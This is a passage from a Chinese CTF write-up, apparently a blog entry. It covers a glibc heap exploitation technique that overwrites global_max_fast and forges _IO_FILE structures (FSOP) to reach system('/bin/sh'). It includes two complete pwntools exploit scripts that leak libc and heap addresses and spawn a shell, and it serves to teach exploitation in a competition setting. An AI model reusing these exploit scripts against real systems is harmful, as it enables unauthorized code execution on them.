<p>在第二个结构体中，我们希望执行 <code>_IO_OVERFLOW</code>  ，因此要将 <code>fp-&gt;_mode == 0</code> <code>fp-&gt;_IO_write_ptr ==1</code> <code>fp-&gt;_IO_write_base == 0</code> ,这样即可触发 <code>_IO_OVERFLOW</code> 。在这之前只需要伪造好第二个结构体的 <code>flags</code> 字段和 <code>vtable</code> 中的 <code>overflow</code> 让其指向 <code>system</code> 的地址即可获取 <code>shell</code></p>
<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>第二个方法就是只伪造第一个结构体，因为我们是可以控制 <code>vtable</code> 的，而作为参数的 <code>flags</code> 字段位于堆块的 <code>prev_size</code> 上，在上一个堆块处于使用状态时， <code>prev_size</code> 是作为上一个堆块的用户区域，所以这个字段也是可控的，只需要让上一个堆块申请为 <code>size</code> 以 <code>8</code> 结尾的即可。最后用 <code>/bin/sh\x00</code> 填满堆块，从而控制了结构体中的 <code>flags</code> 字段。别忘记伪造字段来触发 <code>_IO_OVERFLOW</code></p>
<p>这里简单说一下篡改<code>  global_max_fast</code> ，最终效果是可以在一个高于 <code>fastbinY</code> 的地址处写一个堆地址（这个的攻击本质就是数组溢出，后续利用通常是攻击IO），但还有一个条件是对申请的堆块的 <code>size</code> 不能限制的太小，如果索引太小的话无法修改到我们期望的目的地址。然后利用过程是先申请一个精心构造好 <code>size</code> 的堆块，接着篡改 <code>global_max_fast</code> （这里顺序不要弄反），再将刚刚申请的堆块释放，即可触发攻击，向一个 <code>libc</code> 地址中写入刚刚申请的堆地址。</p>
<p>该手法利用的关键在于 <code>size</code> 如何计算  具体的话请参考 我的这篇<a href="https://zikh26.github.io/posts/30a1c326.html#%E7%AF%A1%E6%94%B9global-max-fast">文章</a> </p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>这里俩exp都放一下吧,整体思路都差不多其实。下面这个是伪造一个结构体的exp</p>
<p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xDC1</span></span><br><span class="line">d_d=<span class="number">0xdd9</span></span><br><span class="line">d_e=<span class="number">0xDCD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content length:\n&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;ontent:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Comment:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content id:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment">#leak libc address</span></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x1008</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="built_in">int</span>(<span class="number">0x1008</span>/<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x100</span>,p64(<span class="number">0xdeadbeefdeadbeef</span>)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#leak heap address</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fastbin_ptr=libc_base+<span class="number">0x3c4b28</span></span><br><span class="line">global_max_fast=libc_base+<span class="number">0x3c67f8</span></span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">chain=libc_base+<span class="number">0x3c5688</span></span><br><span class="line">vtable_addr=libc_base+<span class="number">0x3c56f8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">index=(chain-<span class="number">8</span>-fastbin_ptr)/<span class="number">8</span></span><br><span class="line">size=index*<span class="number">0x10</span>+<span class="number">0x20</span></span><br><span class="line">log_info(<span class="built_in">hex</span>(<span class="built_in">int</span>(size)))</span><br><span class="line"></span><br><span class="line">add(<span class="built_in">int</span>(size),p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(heap_addr+<span class="number">0x1710</span>)+p64 (sys_addr)*<span class="number">4</span>)<span class="comment">#伪造的结构体</span></span><br><span class="line">edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(global_max_fast))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xCF1</span>,<span class="number">0xDE5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>下面这个exp是俩结构体的，比赛的时候写的是这个，代码比较烂</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xDC1</span></span><br><span class="line">d_d=<span class="number">0xdd9</span></span><br><span class="line">d_e=<span class="number">0xDCD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content length:\n&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;ontent:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Comment:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content id:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,p64(<span class="number">0xdeadbeefdeadbeef</span>)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">fastbin_ptr=libc_base+<span class="number">0x3c4b28</span></span><br><span class="line">global_max_fast=libc_base+<span class="number">0x3c67f8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">file=FileStructure()</span><br><span class="line">file.flags=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">file.vtable=heap_addr+<span class="number">0x620</span>+<span class="number">0x10</span>+<span class="number">0xe0</span></span><br><span class="line">file._IO_write_ptr=<span class="number">1</span></span><br><span class="line">file._IO_save_base=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="built_in">bytes</span>(file)+p64(sys_addr)*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">chain=libc_base+<span class="number">0x3c5688</span></span><br><span class="line">vtable_addr=libc_base+<span class="number">0x3c56f8</span></span><br><span class="line">index=(chain-<span class="number">8</span>-fastbin_ptr)/<span class="number">8</span></span><br><span class="line">size=index*<span class="number">0x10</span>+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">add(<span class="built_in">int</span>(size),p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(heap_addr+<span class="number">0x620</span>+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">10</span>+p32(<span class="number">0</span>))</span><br><span class="line">edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(global_max_fast))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xCF1</span>,<span class="number">0xDE5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;4.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>比赛结束，环境直接关闭了，也没法打远程，就自己打了下本地。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102111363.png" alt="image-20230110211123791"></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>global_max_fast</tag>
        <tag>FSOP</tag>
        <tag>伪造IO_FILE</tag>
      </tags>
  </entry>
</search>
